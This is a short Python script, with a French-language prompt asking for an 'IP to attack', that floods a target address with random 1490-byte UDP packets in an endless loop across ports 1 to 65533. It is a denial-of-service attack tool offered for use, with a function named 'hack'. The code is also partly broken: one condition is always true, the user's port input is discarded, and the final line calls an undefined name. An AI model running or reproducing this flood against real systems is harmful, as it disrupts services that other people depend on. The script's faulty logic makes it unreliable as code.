
import site
import socket 
import random

site=input("ip a attaquer")
port=input("port ")


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

def hack(site, port):
    if port==80 or port+443:
        print(port)
        sock.sendto(bytes, (site,port))
    elif (port>=1024) and (port%4==0):
        sock.sendto(bytes, (site,port))
    else:
        pass
port=1
while True:
    print(port)
    hack(site, port)
    port = port + 1
    if port == 65534:
        port = 1   


site(l,port)